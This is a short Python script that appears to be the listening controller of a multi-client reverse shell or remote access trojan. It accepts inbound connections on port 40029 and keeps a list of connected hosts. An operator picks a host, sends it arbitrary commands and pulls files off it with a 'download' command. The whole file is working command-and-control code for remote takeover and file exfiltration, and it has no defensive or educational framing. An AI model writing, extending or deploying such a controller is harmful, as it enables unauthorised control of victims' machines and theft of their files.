import threading
import socket

s = socket.socket()
s.bind(('', 40029))
s.listen(5)

add_lis = []
conn_lis = []


def accept_conn():
    while True:
        print("waiting")
        conn, add = s.accept()
        add_lis.append(add)
        conn_lis.append(conn)


def download_file(conn, filename):
    try:
        conn.sendall(str.encode(f"dl {filename}"))
        file_size_info = conn.recv(1024).decode()
        if file_size_info.startswith("FILE_SIZE:"):
            file_size = int(file_size_info.split(":")[1]) 

            with open(filename, "wb") as f:
                received_size = 0
                while received_size < file_size:
                    conn.sendall(b"READY")
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    f.write(chunk)
                    received_size += len(chunk)
                    percent_completed = (received_size / file_size) * 100
                    print(f"Downloaded {received_size} of {file_size} bytes..... {percent_completed:.2f}%", end='\r')
            return f"File {filename} downloaded successfully."
        else:
            return "Error: Invalid file size information received."
    except Exception as e:
        return f"Error downloading file: {str(e)}"


def control_pc():
    while True:
        try:
            print("LIST OF CONNECTIONS :")

            for i in add_lis:
                print(add_lis.index(i), i[0], i[1])
            selection = input(" select connection or type 'skip' to refresh:>>>")
            if selection == 'skip':
                continue
            conn = conn_lis[int(selection)]
            while True:
                cmd = input('>>')
                if cmd == 'end' or cmd == 'END':
                    break
                if cmd.lower().startswith('download ') or cmd.lower().startswith('dl '):
                    filename = cmd[9:].strip() if cmd.lower().startswith('download ') else cmd[3:].strip()
                    if filename:
                        message = download_file(conn, filename)
                        print(message)
                    else:
                        print("Error: No filename specified")
                    continue
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    client_response = str(conn.recv(20480), "utf-8")
                    print(client_response, end="")
        except Exception as e:
            print("Error:", str(e))
            continue

t = threading.Thread(target=accept_conn)
t1=threading.Thread(target=control_pc)



t.start()
t1.start()
t1.join()
t.join()

print("end..")
